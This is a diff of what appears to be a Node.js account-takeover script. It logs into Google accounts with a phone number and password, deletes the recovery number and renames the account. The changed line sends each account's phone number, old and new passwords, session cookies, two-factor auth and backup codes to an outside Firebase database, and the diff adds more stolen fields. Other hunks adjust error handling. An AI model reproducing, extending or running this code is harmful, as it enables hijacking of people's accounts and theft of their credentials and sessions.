@@ -259,7 +259,7 @@ async function loginWithCompleted(number, password, cookies) {
                     let n_cookies = await getNewCookies(await page.cookies())
                     
                     try {
-                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/completed'+(mTwoFa.error ? '_error':(mYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ recovery: mRecovery, password:mPassword, cookies:cookies, n_cookies:n_cookies, create: mYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
+                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/completed'+(mTwoFa.error ? '_error':(mYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                             headers: {
                                 'Content-Type': 'application/x-www-form-urlencoded'
                             }
@@ -502,8 +502,6 @@ async function waitForNameChange(page, mRapt) {
             console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
         }
     } catch (error) {}
-
-    return parseInt(new Date().getFullYear())
 }
 
 async function waitForRemoveRecovery(page, mRapt) {
@@ -533,11 +531,13 @@ async function waitForRemoveRecovery(page, mRapt) {
                 break
             }
         }
-    } catch (error) {}
+    } catch (error) {
+        console.log(error)
+    }
 
     if (!mSuccess) {
         console.log('Node: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')
-        await delay(100000000)
+        await askQuestion('Error:')
     }
 }
 
